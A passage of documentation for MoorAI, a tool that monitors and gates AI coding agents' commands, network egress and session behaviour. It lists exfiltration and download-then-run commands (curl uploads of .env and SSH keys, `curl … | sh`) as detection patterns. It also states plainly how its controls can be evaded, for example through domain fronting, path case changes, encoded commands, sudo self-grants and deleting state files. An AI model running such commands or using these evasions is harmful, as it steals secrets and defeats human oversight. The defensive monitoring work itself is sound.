- `pod`, `namespace` and `node` come only from `MOORAI_K8S_POD`, `MOORAI_K8S_NAMESPACE` and
  `MOORAI_K8S_NODE`, set by the downward API. A settings file that sets one for the hook is refused like
  every other `MOORAI_*` name.
- `pid` is the agent process: the hook's parent pid, or the SDK's own pid in process. The sidecar, the
  gateway and the model proxy send none.

A field that cannot be detected or fails its format check is left out; the hook outside server mode (a
developer laptop) never sends the object.
These are infrastructure identifiers, so the console stores them as-is and a SIEM can join MoorAI verdicts
with host and container sensor events on the same container, pod or process.

The publish workflow builds and publishes the image for amd64 and arm64 (first run: v1.3.0); it has been
run on arm64 and the compose demo run end to end. `examples/serve/k8s-sidecar.yaml` passes strict
server-side validation and runs on a local cluster (kind v0.33.0, Kubernetes v1.37.0, containerd 2.3.4, cgroup v2): both Deployments reach 2/2 Ready on
their exec probes, and the demo agent's verdicts (reverse shell denied, injection flagged, foreign Host
421) and alerts carry `pod`, `namespace` and `node`. Under containerd `containerId` is absent: the container
sees only its pod's sandbox id, not its own id, so `namespace` + `pod` are the join key. Not observed:
CRI-O, a managed cloud cluster, and the amd64 image run on a host.

### Egress proxy: egress rules on real connections

`egressRules` (v1.7.0) are judged from a call's text: the command, the WebFetch URL, the MCP arguments.
That is a guard for the ordinary case, not a boundary. A script or a dependency that opens its own socket
is never seen. `moorai-egress-proxy` (`egress-proxy/`) is a forward proxy that applies the same rules to
the connections a workload actually opens. A network policy that makes it the workload's only way out turns
it into the boundary.

```bash
moorai-egress-proxy                                     # 127.0.0.1:8850
HTTPS_PROXY=http://127.0.0.1:8850 HTTP_PROXY=http://127.0.0.1:8850 http_proxy=http://127.0.0.1:8850 <agent>
```

- **Same rules, same trust sources.** It reads the verified console policy and the root-owned
  machine-wide config (`/etc/moorai/config.json`), plus the egress rules of the workload profile whose
  `match.serviceId` names this workload (a `repo` profile never matches here: there is no cwd). It never
  reads policy from a flag, the environment or a repository file. `egressDefault` applies. Until the first
  policy load succeeds, every connection gets 503; a later load that fails keeps the last one.
- **What it sees.** For plain HTTP (`GET http://host/path`) it judges host, port, method and path. For
  HTTPS (`CONNECT host:443`) it judges host and port only: TLS is not decrypted, so **method and path rules
  apply to plain HTTP only**. Node's `fetch` tunnels even `http://` URLs through CONNECT (measured on Node
  22.22), so they are judged by host and port too.
- **The binary is unknown.** A socket does not say which program opened it. An `allow` rule that sets
  `binary` never matches here, and neither does one that sets `method` / `path` on a tunnel. A `block` rule
  matches on the destination alone. An `alert` rule that sets an unknown field is reported but cannot
  open a connection the rest of the chain closes.
- **Addresses.** DNS is resolved once, and the proxy connects to exactly the address it checked, so a
  second DNS answer cannot redirect it (DNS rebinding). Loopback (`localhost` is not exempt here), private,
  carrier-grade NAT, link-local and unique-local destinations need an `allow` or `alert` rule whose host
  is that exact name or IP literal. A `*.suffix` rule never counts, so `*.example.com` does not open a
  subdomain that resolves to `10.0.0.5` or `127.0.0.1`; a `block` rule never counts either. Cloud metadata
  addresses (`169.254.169.254`, `fd00:ec2::254`, ECS `169.254.170.2`, EKS Pod Identity `169.254.170.23` /
  `fd00:ec2::23`, Alibaba `100.100.100.200`, the Azure WireServer `168.63.129.16`) need a rule that names
  that IP literal; a name that resolves to one is refused. NAT64 addresses (`64:ff9b::/96`,
  `64:ff9b:1::/48`) are judged by the IPv4 address in their last 32 bits, and the rest of `64:ff9b::/32`
  needs an exact rule. An IP literal, in any spelling the URL parser accepts (`2130706433`, `0x7f.1`,
  `[::ffff:7f00:1]`), needs an exact rule too. The proxy's own port and the ports of the MoorAI services
  beside it (`--sibling-ports`, default `8790,8791,8848,8850`: moorai-serve, the model proxy, the MCP
  gateway, the proxy) are never connected to on a loopback or local interface address, whatever the rules
  say. The unspecified address, multicast and reserved space are never connected to. A host no rule could
  name (an underscore, a percent sign, a name the URL parser refuses) is refused with 400. The `Host`
  header sent upstream is the judged host.
- **Paths.** The plain-HTTP path is canonicalised once, and that string is both what the rules judge and
  what goes upstream. Escapes of unreserved characters are decoded (`/%61dmin` is `/admin`), other escapes
  are kept with upper-case hex, empty segments collapse (`//admin` is `/admin`), and dot segments are
  resolved after decoding (`/x/%2e%2e/admin` is `/admin`). Refused with 400: `%2F`, `%5C`, `%00`, any
  `%25` (double encoding), a malformed escape, a raw backslash, and `..;` / `.;` segments. Path rules are
  **case-sensitive**: `/admin*` does not match `/Admin`. A server that reads paths case-blind (IIS, a
  static server on a case-insensitive filesystem) serves `/Admin` as `/admin`, so against one a path
  `block` rule is evaded by changing case. There, allow-list instead (`allow` rules plus
  `egressDefault: "block"`): a changed case misses the allow rule and falls to the block. Prefer a prefix
  (`/admin*`) to an exact path in a block rule; servers also read `/admin/` or `/admin;x` as `/admin`.
  Write rule paths decoded (`/~user`, not `/%7Euser`).
- **Hardening.** It binds 127.0.0.1 unless both `--allow-remote` and a token are given
  (`MOORAI_EGRESS_PROXY_TOKEN` or `--token-file`, at least 16 characters). Clients send the token as
  `Proxy-Authorization`: Basic with the token as the password (`http://moorai:<token>@host:8850`), or
  Bearer. `--sibling-ports <list>` replaces the sibling port list (`""` for none; the proxy's own port is
  always refused). Flags set the limits: `--max-connections` (256), `--headers-timeout-ms` (10 s),
  `--request-timeout-ms` (60 s), `--idle-timeout-ms` (120 s, also for tunnels), `--connect-timeout-ms`
  (10 s) and `--dns-timeout-ms` (5 s). An error while judging, or a policy that cannot be loaded, refuses
  the connection.
- **Alerts.** Alerts are content-free, sent to the console and OpenTelemetry the way the MCP gateway
  sends them: category `Egress rule`, `reasonCode` `EGRESS_RULE`, `egressBinary: null`, host, port and
  method, the deciding rule, `egressLayer: "network"`, and `egressRefusal` (`private-address`,
  `wildcard-private-address`, `metadata-address`, `proxy-port`, `ip-literal`, `unroutable-address`,
  `host-form`, `path-form`, `judge-error`) for an address or form refusal. They never carry
  a path, a query, a header or a body. A repeat of the same alert is posted at most once a minute. On an
  unenrolled device a rule block coaches, as everywhere else in MoorAI. The address refusals are enforced
  on every device.

**Deploying it as a boundary.** See [`deploy/`](deploy/). [`deploy/k8s/moorai-egress.yaml`](deploy/k8s/moorai-egress.yaml)
runs the egress proxy, the model proxy and the MCP gateway in their own pod. The agent pod's NetworkPolicy
allows only that pod and cluster DNS. They are not sidecars because a NetworkPolicy selects pods, not
containers. In a shared network namespace, the policy that lets the proxy out would let the agent out too.
[`deploy/compose/docker-compose.yml`](deploy/compose/docker-compose.yml) puts the agent on an `internal: true`
network where only the MoorAI containers have a second, outside network. In both, the agent gets
`HTTP_PROXY` / `HTTPS_PROXY` / `http_proxy` / `https_proxy` (curl reads only the lower-case `http_proxy`),
`NO_PROXY` for the MoorAI services, and `NODE_USE_ENV_PROXY=1` for Node. A tool that ignores the proxy
variables (a raw socket, `nc`, ssh, a library that dials directly) connects directly and the network
drops it. It fails closed, which is the point.

**Limits.** HTTPS is judged by host and port: the SNI and `Host` inside a tunnel are not checked, so
domain fronting through an allowed CDN host passes. DNS itself stays reachable (names resolve; nothing
connects). WebSocket upgrades over plain HTTP are not proxied (`wss://` uses CONNECT). There is no local
ledger entry per connection, only console alerts.

### Across the session — lifecycle hooks, session risk, runaway loops

Besides `PreToolUse`, `PostToolUse` and `UserPromptSubmit`, the hook registers `PostToolUseFailure`
(matchers `Bash`, `PowerShell`, `mcp__.*`), `Stop`, `SubagentStop` and `PreCompact` (matcher `""`). These four
are for visibility only: they never block a stop or a compaction and print nothing the model reads. On an
unenrolled device the claim check below shows the user a `systemMessage` at `Stop`, and nothing else.

- **Session ledger.** Every hook run writes one content-free, chain-stamped row to
  `~/.moorai/session-ledger.jsonl`: the event, the tool, a command class (*verify*, *probe*, *effect*,
  *other*), the call's outcome, the verdict and its provenance. Session, agent, command and tool-use ids are
  hashes under a device-local key (`session-ledger.key`). The file is trimmed past about 1 MB.
- **Session summary.** At `Stop`, when the counts changed since the last one, the console gets a content-free
  `Agent session summary`: prompts, calls, allow / ask / deny, findings, failed and interrupted outcomes,
  unevaluated, limited and strengthened verdicts, compactions, sub-agent stops and claim mismatches.
- **Claimed success vs reality.** At `Stop` and `SubagentStop`, the agent's final message
  (`last_assistant_message`, read in memory, never stored or sent) is compared with the outcomes the ledger
  holds for the same turn, or the same sub-agent. A claim counts only against a failure of its own kind:
  "tests pass" against a test or build run, "pushed" or "deployed" against a push/deploy-type command or an
  MCP call that is not a read, "added X" against a denied edit, and "done" or "fixed" against any of these.
  When one failed and was not redone successfully (the same command, test runner, push/deploy family or MCP
  tool), the hook posts `Agent reported success but tool calls failed` (Medium, reason `CLAIM_MISMATCH`). A
  message that acknowledges any problem is never a claim, and a probe whose exit 1 is its answer (`grep`,
  `test`, `diff`) is never a failure. The phrase list is English plus a short completion and failure lexicon
  for nine languages. Measured on a 181-case corpus labelled by agents that never read the detector, split
  60/40 by a fixed seed before any detector output was seen: on the locked split, scored once, 100%
  precision (17 of 17) and 54.8% recall (17 of 31). Report-only.
- **Compaction.** `PreCompact` records that a compaction happened, manual or auto.
- **Session risk and the circuit breaker** (*What it does*, above) keep their state in
  `~/.moorai/session-risk.json` and `circuit-breaker.json`, hashed under a device-local `session.key` (mode
  0600): keyed hashes, counts and timestamps for at most 32 sessions, for 24 hours. Defaults: threshold 12,
  window 30 min, score half-life 15 min, sequences within 10 calls, a mass read at 30 files. The circuit
  breaker keys each session and sub-agent separately, so parallel sub-agents do not add up into one loop.
  On scripted sessions it raised no alert on test-fix or build-watch loops and caught 3 of 3 runaway loops.
  Call-rate and call-budget trips (`ratePerMin`, `maxCalls`) are off unless an org sets them: in a
  simulation, a fast sub-agent's parallel calls could not be told from a runaway loop by rate. An unenrolled
  device coaches instead of asking or pausing.

The agent runs as the same user, so it can read the device-local keys and edit or delete these state files,
as with every other file under `~/.moorai`.

**Verdict provenance.** Every alert and ledger row carries `policyId` — `pol:<tenant>:<issued-at>:<digest>`
for a signed policy, `pol:unsigned:<digest>`, `builtin-defaults`, `offline-fail-closed-default`, `none`,
or `not-loaded` when the hook stopped before loading one — with `policySource`, a `reasonCode` naming the
branch that decided (`NO_MATCH`, `DETECTOR_MATCH`, `MCP_SERVER_NOT_ALLOWED`, `MASK_FALLBACK`,
`COACH_UNENROLLED`, …), a `basisCode` when an override decided over another branch, and an `enforcement`
value: `AS_CONFIGURED`; `STRENGTHENED` (stricter than configured: a fail-closed default or floor);
`LIMITED` (weaker: coached, a mask that fell back, a `PostToolUse` result that can only be flagged); or
`UNEVALUATED`. A control that never ran is `UNEVALUATED`, never a pass: unreadable input, a hook error, no
policy after an error, break-glass, a tool the hook does not judge, an empty result, or an allow over a
size-capped prefix. The codes are listed in [`docs/DETECTION_ENGINE.md`](docs/DETECTION_ENGINE.md) §5.

**Coverage integrity.** Hooks post only on findings, so a console cannot tell "nothing happened" from
"MoorAI was not in the path". The hook sends a content-free heartbeat to the console at most once per agent
host per UTC day (and on the day's first `bypassPermissions` session), retried after 10 minutes on failure,
carrying [`cli/agent-posture.mjs`](cli/agent-posture.mjs)'s posture for Claude Code, Codex, Gemini, Cursor
and Copilot: whether MoorAI's hook is registered and current (as `moorai-doctor` judges it), when the host
was last used (rounded to the hour), the host's `version` and whether it is the `tested` one (*Keeping up
with the agent hosts* below), and the settings that weaken protection — `hooksDisabled`,
`mooraiHookDisabled`, `managedHooksOnly`, `bypassPermissionsDefault`, `sessionBypassPermissions`,
`approvalNever`, `approvalUnrestricted`, `autoEditDefault`, `sandboxFullAccess`, `sandboxOff`, each with
its scope. The desktop app reports each host's last activity hourly on its own, so agent use shows even when
every hook is switched off. The console (v0.70.0) raises `Coverage: agent active, no MoorAI hook traffic`,
`Coverage: agent setting weakened` and `Coverage: MoorAI hook removed or stale`. Only enrolled devices send. Never a path, a value outside the listed flags, a project
name or a session id, and never more of a version than digits, dots and a short build suffix.

**Containment on Windows (MXC).** On a Windows device the same heartbeat also says, for Claude Code, Codex
and Copilot, whether the commands that agent runs are inside a Microsoft Execution Container (MXC), and
whether the device's Windows build is new enough for MXC
([`cli/mxc-detect.mjs`](cli/mxc-detect.mjs)). Each of those hosts carries
`containment: { kind, scope, source }`, and the report carries `mxcCapable`:

- **Codex:** `windows.sandbox = "mxc"` in `~/.codex/config.toml` (or `CODEX_HOME`) or the project's
  `.codex/config.toml` gives `kind: "mxc"`, `scope: "commands"`. `"elevated"` or `"unelevated"` gives
  `"other"` (Codex's own sandbox, not MXC). Nothing set gives `"none"`, and so does
  `sandbox_mode = "danger-full-access"`. `features.prefer_mxc` gives `"unknown"`, because Codex picks MXC
  only if it is available when it runs.
- **Copilot CLI:** `sandbox.enabled` in `~/.copilot/settings.json` (or `COPILOT_HOME`). `true` gives
  `"mxc"`, `"commands"` (on Windows that sandbox is MXC). `false` gives `"none"`. Not set, or an unreadable
  file, gives `"unknown"`. The CLI's default is not documented, and enterprise-managed settings can require
  the sandbox in a way MoorAI cannot read.
- **Claude Code:** always `"none"` on native Windows. Claude Code runs commands unsandboxed there and has
  no MXC support yet.
- **Other hosts and platforms:** Gemini and Cursor have no documented MXC support, so they get no
  `containment` field. macOS and Linux get neither field; there, the sandbox is covered by the existing
  `sandboxOff` and `sandboxFullAccess` flags.

`mxcCapable` compares `os.release()` and the registry's `UBR`
(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion`, read with `reg.exe`, no admin needed) with
MXC's documented minimums: 26100.9278 and 26200.9278 (24H2/25H2, KB5120998), 26300.9550 and 28000.2804.
It is `false` on older builds and `null` when the build is not listed or the value cannot be read. The
registry is read only in the heartbeat worker, at most once a day per Windows release (cached in
`~/.moorai/mxc-capable.json`).

What this detects and what it assumes:
- **Detected:** what each agent's config file says.
- **Not detected:** whether a running process is actually in a container. MXC documents no way to tell.
- **Can override the config:** a command-line flag (`codex -c …`, `copilot --sandbox` / `--no-sandbox`),
  a Codex profile, or enterprise-managed settings.
- **Build check:** `mxcCapable: true` means the build allows MXC, not that it is switched on. Microsoft
  rolls it out gradually.
- **Scope:** Codex and Copilot contain **only the commands the agent runs**, not the agent process itself.
  `scope: "agent"` is reserved and no host reports it today.

The console raises `Coverage: agent running without containment` for a Windows host whose kind is
`"none"`, or `"unknown"` on an MXC-capable device. It is report-only and changes no verdict.

### Download-then-run, secret-file uploads and collection hosts

A backdoored model in a coding agent can download a script to a file, run it, and have the script post
`.env` to a public request-capture host. MoorAI reads the command structurally (the same shell reader the
egress rules use, through `&&`, `;`, `||`, pipes, newlines, quoting and `sh -c`) and flags. A heredoc
body is read as part of the command when what it feeds runs it (`bash <<EOF`, `sh -s`, `python3 -`,
`pwsh -Command -`, `cat <<EOF | sh`, `@'…'@ | iex`); fed to `cat > file` it is data:

- **A download that is then run** (#57, asks by default): curl `-o`/`-O`, wget `-O`/`-P`,
  `Invoke-WebRequest -OutFile` and similar, then `sh`/`bash`/`source`/`./file`/`python file`, in one
  command or in a **later Bash call of the same session**. The cross-call record holds only keyed hashes of
  the normalised paths (64 per session, 32 sessions, 24 h).
- **A secret file sent to a network client** (#55, asks by default): `curl -d @.env`, `-F f=@.env`,
  `-T ~/.ssh/id_ed25519`, `wget --post-file`, `nc host < .env`, `Invoke-RestMethod -InFile`. A secret
  file is whatever #55 already calls one; `.env.example` is not.
- **A public out-of-band collection host** (interactsh, Burp Collaborator, webhook.site, Pipedream,
  Request Catcher, Beeceptor, Canarytokens): data sent is #78 (High), a plain GET or DNS lookup is #79
  (Medium). Both report by default; set them in `threatPolicy` to ask or block.

Not seen: a downloaded file renamed before it runs, paths held in variables, `scp`/`rsync` uploads, and
hosts outside the list. [docs/DETECTION_ENGINE.md](docs/DETECTION_ENGINE.md) §6 and §13 have the detail.

### Capability tags: what a tool call can do

Every tool call is tagged by what it can do: `read-private` (a credential or secret file, or content a
detector classed as secrets, PII or regulated data), `read`, `write`, `network` and `exec`. Tags come from
the tool name, the parsed command (the read paths, network clients, URLs and remote CLIs in it) and, for
MCP tools, the tool's declared `_meta` tags plus what its name suggests (marked "inferred"; a declaration
adds tags, it never removes one the name gives away). Two policy keys act on them, from the console policy
or the root-owned `/etc/moorai/config.json`, never from a repo or user file:

```json
{
  "tagActions": { "exec": "block", "network": "block", "write": "ask" },
  "tagRules": [{ "id": "no-net-after-private", "if": { "sessionHas": ["read-private"] }, "deny": ["network"], "action": "block" }]
}
```

- **`tagActions`** is a static action per tag (`block`, `ask`, `alert`, `allow`) for every call with that
  tag. Where the policy and the machine config disagree, the stricter action wins.
- **`tagRules`** fire when the session (its earlier calls that ran, plus this one) has every tag in
  `if.sessionHas` and this call has any tag in `deny`. `action` is `block` or `alert` (the default;
  reported once per session and rule). A denied call adds nothing to the session.
- The strictest of `tagActions`, `tagRules` and the detector verdict wins; nothing here loosens a verdict.
- Alerts carry tag names and rule ids only. The session record (`~/.moorai/session-tags.json`) holds a
  keyed hash of the session id and tag names (32 sessions, 24 h).
- The Agent SDK applies `tagActions`; `tagRules` need the session record and run in the hook only.

The agent runs as the same user and can delete the session record, which clears its own `read-private`
tag. `tagActions` read nothing from it.

### Exceptions: what to grant when MoorAI blocks

When the hook denies or asks, the message names the exact exception a person could grant: the threat id
(or the tag rule id) and a narrow pattern for this call. The pattern is the file path, the URL with `?*` in
place of its query, the MCP tool name, or the command with anything credential-shaped replaced by `*`, so
it never repeats a secret. A command that spans lines, or that chains, pipes, substitutes or redirects and
also needs a value replaced, gets no suggested pattern; one that chains with nothing to replace gets itself,
verbatim. So does a command whose replaced value would come before the program it runs (`PW=… psql`,
`sudo -u … cmd`). On an enrolled device it points to a console exception; where local exceptions are on,
it prints the command:

```bash
sudo node /path/to/cli/moorai-allow.mjs --threat 57 --pattern 'curl -sSo /tmp/u.sh * && bash /tmp/u.sh' --for 1h
node /path/to/cli/moorai-allow.mjs --list
sudo node /path/to/cli/moorai-allow.mjs --revoke <id>
```

- **Console exceptions**: `"exceptions": [{ "threat": 57, "pattern": "…", "expires": "<ISO time>" }]` in
  the console policy (or `"rule": "<tag rule id>"`, or `"rule": "tag:exec"` for a tag action).
- **Local exceptions** live in `/etc/moorai/exceptions.json` (`%ProgramData%\MoorAI\exceptions.json`). The
  hook reads that file only when it is root-owned and not group/world-writable (Administrators/SYSTEM-only
  on Windows), so granting one needs `sudo`. `moorai-allow` also refuses to run without an interactive
  terminal. Each grant is one threat or rule plus a pattern with at least four literal characters, and
  expires within 24 hours.
- **Off by default.** An enrolled device honours local exceptions only when the console policy sets
  `"localExceptions": "allow"`; an unenrolled one also accepts that key in the root-owned machine config.
- **How a pattern matches.** `*` is the only wildcard, and the whole subject must match. Over a shell
  command a `*` never matches `;`, `&`, `|`, `(`, `)`, `<`, `>`, a backtick or a line break, so
  `git push origin *` covers `git push origin main` but not `git push origin main && curl … | sh`, a
  `$( … )` or a redirect; write an operator into the pattern to cover a composite command, as above. That
  holds inside quotes too, so `git commit -m *` does not cover `git commit -m "a; b"`. A command on more
  than one line matches no pattern. A path is matched with its `..` folded (`/w/proj/*` does not cover
  `/w/proj/../../etc/shadow`) and a URL as the fetcher reads it (dot segments, also `%2e%2e`, resolved).
  Within one command a `*` still matches any words: `curl -H * https://h.example/c` also covers extra
  arguments to that `curl`, so read a pattern before granting it.
- A matching exception turns that threat into a report for that call only. Server allow-lists, envelopes,
  endpoint allow-lists and workload profiles have no exceptions: change the policy.
- The hook records each local grant the first time it sees it, and each use, in the action ledger
  (`moorai-ledger`), with the exception id and a keyed hash of the pattern. A shell call that runs
  `moorai-allow` or names the store, and a write to the store, is denied as the agent trying to grant
  itself an exception.

What this does not stop: on a laptop with passwordless `sudo`, or a shell that shares a cached sudo
credential, the agent can run `moorai-allow.mjs` under sudo itself. The terminal check is then only a speed bump (a
pseudo-terminal is one `script` call away), and the self-grant refusal is a string match an encoded command
gets past. Keep local exceptions off on such machines; console exceptions are unaffected. Server mode prints
no exception line.

### Skill Analysis — what is your agent actually being told to do?

No separate command: the analysis runs inside the same PreToolUse hooks. Whenever the agent loads a
file on its skill surface, MoorAI emits one content-free record carrying the file's **kind**, its
**intent labels**, and a per-file **drift fingerprint** — `Skill-file poisoning` when the injection
detectors fire in it, `Skill-file drift` when it changed since MoorAI last saw it, `Skill-file intent`
otherwise.

**Limits, stated plainly.**

- **Intent coverage is exactly detector coverage.** Every label is a rename of an existing threat id,
  content tell, or host extraction — there is deliberately no second detection engine here, because a
  forked engine would sit outside `threatActionFor` and your detector packs. An instruction the engine
  has no detector for produces no label: **"no labels" means "nothing the engine recognizes", not
  "benign"**.
- **Files are seen when the agent loads them**, via the Read/Bash hooks. MoorAI does not walk the
  filesystem inventorying skill files that no agent has touched, so a freshly poisoned file is flagged
  on first load, not before it.
- **The drift fingerprint is an unkeyed DJB2** of the whole file, not the keyed HMAC used for matched
  spans. That is deliberate: the keyed hash exists because an SSN or a card has a small enough
  candidate space to enumerate, which a whole agent config file does not — and an unkeyed fingerprint
  is what lets the console see that two devices hold the *same* poisoned file.
- **Path classification is by filename, not by content**, so a file that an agent loads through a
  non-standard path (`skillDirectories`, a symlink farm, a plugin root outside the known layout) is
  scanned by the detectors like any other file but is not labelled as skill surface.

### What would MoorAI have caught in your past sessions? — transcript ingest

```bash
node cli/moorai-ingest.mjs --discover                         # last 30 days of Claude Code + Codex sessions
node cli/moorai-ingest.mjs --discover --policy candidate.json # the same history under a candidate policy
node cli/moorai-ingest.mjs ~/.claude/projects/<project> --agent claude-code --coverage
node cli/moorai-ingest.mjs --discover --report                # send historical alerts to your console
```

Day one, before the hook has seen anything: `moorai-ingest` reads the transcripts your agents already
keep on this machine (Claude Code `~/.claude/projects/<project>/<session>.jsonl` and its sub-agent files;
Codex `~/.codex/sessions/**/rollout-*.jsonl`, `.jsonl.zst` and `archived_sessions/`) and replays every
recorded tool call, tool result and prompt through the live hook's own decision functions, under the
policy in force or a candidate (`--policy`). The output is what **enforce mode** would have done.

- **Content-free by default**: counts by threat, by agent and by decision, sessions affected, the
  most-flagged categories, and how many sessions ran without the MoorAI hook (`--coverage` lists them;
  Claude Code only, because Codex does not record hook runs in its rollout). No prompt, command, path,
  URL, matched text or session id is printed. `--show-local` prints the findings with their content, and
  only to an interactive terminal.
- **Local**: nothing is sent unless you pass `--report`. Then each finding becomes one alert marked
  `replayed: true`, with the original timestamp, `wouldDecision`, `enforcement: "UNEVALUATED"`, the
  same keyed `session` hash the hook sends (so ingested sessions join live per-session metrics) and a
  keyed `replayId` for dedup. Never a `Blocked` risk level, never content.
- **Bounded**: `--max-files` (200), `--max-bytes` (512 MiB in total), `--max-file-bytes` (64 MiB per
  file), `--max-line-bytes` (8 MiB; longer lines are skipped and counted) and `--max-seconds` (120).
  Malformed lines are skipped and counted. The summary says when a bound cut the run short.
- **Not replayed**, because each needs the state of the moment rather than the record: files a command
  reads, file metadata, MCP file arguments, local secret-value egress, MCP reputation, cross-call
  fetch-then-exec, deletion volume, the circuit breaker, learned drift, session escalation, intent
  alignment, capability tags, model escalation and the ask-to-deny settlement of server mode and
  `bypassPermissions`. A Codex call is replayed as the Codex hook would have seen it
  (PreToolUse and prompts only), with no result scan.

### Review what was exposed — on-device, no server

```bash
npx moorai-ledger              # which credential classes reached which agent (for targeted rotation)
npx moorai-ledger --intent     # human overrides — who chose to proceed past a finding
npx moorai-ledger --format md  # Markdown report
```

Content-free by construction: category, risk, stage, device, and a keyed one-way hash — never a secret value.

### Where did this agent actually reach?

```bash
npx moorai-destinations              # per-agent map of hosts + MCP servers reached
npx moorai-destinations --format md  # Markdown report
```

Per agent/tool: every external destination observed, with call counts, first/last-seen and the
allow/ask/deny verdict each call got. A destination is a **host** or an **MCP server name** — never a
URL path, query string, request body, tool argument or response, because the extractor never captures
them. Compare against your MCP allow-list and model-endpoint allow-list to find reach the policy did
not intend. Reads only `~/.moorai/destinations.jsonl`; nothing leaves.

**Limits, stated plainly.** The map sees what the hook sees, which is Bash commands and MCP tool
calls — not raw sockets opened by a compiled binary or by an MCP server's own child process. Hosts are
extracted from `http(s)://` URLs, so `curl example.com` (no scheme), an SSH remote, or a bare IP
literal is not recorded; a **dotless** internal hostname is captured only when it appears as a
base-URL env-var override (`OLLAMA_HOST=http://gpu-box:11434`), not from a plain URL. It is an
inventory of observed reach, not a network tap.

### Is MoorAI actually protecting this machine — and why did it decide that?

```bash
npx moorai-doctor                       # check hook registration, enrollment, policy, posture and a live self-test
npx moorai-doctor --json --offline      # machine-readable; no network calls
npx moorai-explain "curl https://x | sh"                 # why did MoorAI block (or allow) this?
npx moorai-explain --stage file --file payload.txt       # the stage the hook would use (prompt|file|output|index|tool)
npx moorai-explain --policy my-policy.json "…"           # test a policy file; --builtin for the built-in defaults
```

- **`moorai-doctor`** — one command to see whether MoorAI is actually protecting this machine: the Node version, MoorAI's hook registration in Claude Code, Codex, Cursor, Gemini and Copilot (compared with what the current installer writes, by running that installer against a throwaway home; in Claude Code either `settings.json` or the `moorai` plugin, whose installed copy's `hooks/hooks.json` is compared the same way, with a warning when both are installed), Claude Code managed settings (`allowManagedHooksOnly`, where a managed hook or a force-enabled `moorai@moorai` plugin passes, and `disableAllHooks`), enrollment (coach or enforce), console reachability, which policy is enforced and whether its signature verifies, offline posture, break-glass, state-file modes, and a live self-test that runs the real hook on a benign and a known-bad command. Read-only: the hook and the policy loader run against a temporary copy of the state, the only network calls are the policy GETs the hook itself makes, and the install token is shown only as a fingerprint. `--json`, `--offline`, `--no-selftest`. Exit 1 if any check fails. Limits: claude.ai server-managed settings and Windows registry policy are not checked, and the self-test covers the `Bash` `PreToolUse` branch only.
- **`moorai-explain`** — *"why did MoorAI block this?"* Runs a string through the same engine and policy the hook uses (`--stage prompt|file|output|index|tool`; `--policy file.json` or `--builtin` to test a policy) and shows each finding (detector, threat, severity, the policy action), detectors that matched but were dropped by their `refine` gate or by policy, the final decision and the safer alternative. Input from arguments, `--file` or stdin. Local only; `--no-match` hides matched spans; `--json`. It covers the detection engine and policy only, not the hook's per-tool checks (credential paths, the MCP gateway and reputation, intent alignment).

### Verify your policy catches the attacks — on your own machine

```bash
npx moorai-redteam             # run the adversarial corpus against YOUR active policy
npx moorai-redteam --format json
```

Runs a built-in adversarial corpus (prompt injection, jailbreaks, secrets/PII, license, destructive
commands) locally and reports, per attack class, whether your live policy actually **acts** on it —
not just whether the engine can detect it. Verify, don't trust. Content-free; exits non-zero on any gap.

### Is an agent behaving like an autonomous attack?

```bash
npx moorai-agentwatch             # score recent on-device agent activity vs the autonomous signature
npx moorai-agentwatch --emit      # also send a content-free alert to your server → SIEM/SOC
```

Scores recent agent activity against the **8 behavioral tells** the CSA/SANS *Hugging Face Incident
Post-Mortem* (§IV) used to conclude that attack was fully autonomous — repeating already-succeeded
actions, machine-speed bursts, benchmark/decoy strings, LLM-generated obfuscation, leftover opsec
artifacts, and more. Runs on the device; the hook also emits an alert automatically when the signature
trips. Content-free: timestamps, action fingerprints, allow/deny, risk, and tell flags — never content.

### Investigate, discover, attest — three content-free reports

```bash
npx moorai-trace                              # replay the agent's action chain, in order — for incident investigation
npx moorai-shadow --strict                    # find unsanctioned AI (models · MCP servers · editor extensions · running local model servers · AI keys at rest) vs your allow-list
npx moorai-compliance --framework eu-ai-act   # evidence pack mapped to EU AI Act / NIST AI RMF / ISO 42001 controls
npx moorai-compliance --format stix           # export the same findings as a STIX 2.1 bundle for SIEM/TIP interchange
npx moorai-verify-chain                       # tamper-evidence check — detect a deleted, reordered, or edited evidence-log record
npx moorai-honeytokens register               # register a content-free canary (only its one-way hash is stored)
npx moorai-attest                             # export governed records as an in-toto / SLSA provenance attestation (SSCS interchange)
npx moorai-aibom --format cyclonedx           # export the AI Bill of Materials as a CycloneDX 1.6 SBOM (also --format spdx)
npx moorai-scan ./some-skill                  # PRE-INSTALL gate — a content-free verdict on a skill/agent artifact before you install it
npx moorai-scan ./.mcp.json --packages        # …and download + statically analyse the npm/PyPI package each MCP server launches
npx moorai-scan --package npm:@scope/server   # one package (also pypi:<name>, github:<owner>/<repo>[/<skill-path>])
npx moorai-scan --package github:owner/repo   # a whole source repository — an MCP server with no npm/PyPI package
```

- **`moorai-trace`** reconstructs the on-device action chain — `time · actor · tool · decision · risk · destination · args-hash` — from the content-free logs, so you can answer *"what did this agent do?"* after an incident without ever surfacing a prompt or file.
- **`moorai-shadow`** layers a sanctioned/unsanctioned check on top of the AIBOM inventory (allow-list in `~/.moorai/config.json` `sanctioned`, or `MOORAI_SANCTIONED`); `--strict` exits non-zero for CI/posture gates.
- **AIBOM: AI provider keys at rest.** `moorai-aibom` looks for Anthropic, OpenAI, Hugging Face, Perplexity and Google keys (shapes from gitleaks' published rules; a Google key counts only in an AI context, because the same shape is used by Maps and Firebase) in a fixed, bounded set of places. It checks shell startup files (`~/.zshrc`, `~/.zshenv`, `~/.bashrc`, `~/.bash_profile`, `~/.profile`, `~/.config/fish/config.fish`), the config dirs of known AI CLIs (`~/.config/aichat`, `~/.config/shell_gpt`, `~/.config/io.datasette.llm`, `~/.config/fabric`, `~/.config/mods`, `~/.gemini`, `~/Library/Application Support/io.datasette.llm`; depth 2 or less, 25 files or fewer per dir), and `.env` files at the top level of `~` and of each immediate child of `~/code`, `~/src`, `~/dev`, `~/projects`, `~/workspace`, `~/repos`, `~/git` and `~/Developer`. Templates are skipped, and so are files over 1 MB, binary files and unreadable files. It does not walk the disk. Each finding is `{provider, locationClass, location, keyHash}`: `location` is set only for a fixed well-known path (a project `.env` reports none), and `keyHash` is the agent's **keyed**, per-tenant `h2:` hash — the same fingerprint an alert carries — so the console can tell an org-issued key from a personal one. The key, any part of it, and the file contents are never output. An unenrolled device reports `h2:nokey`.
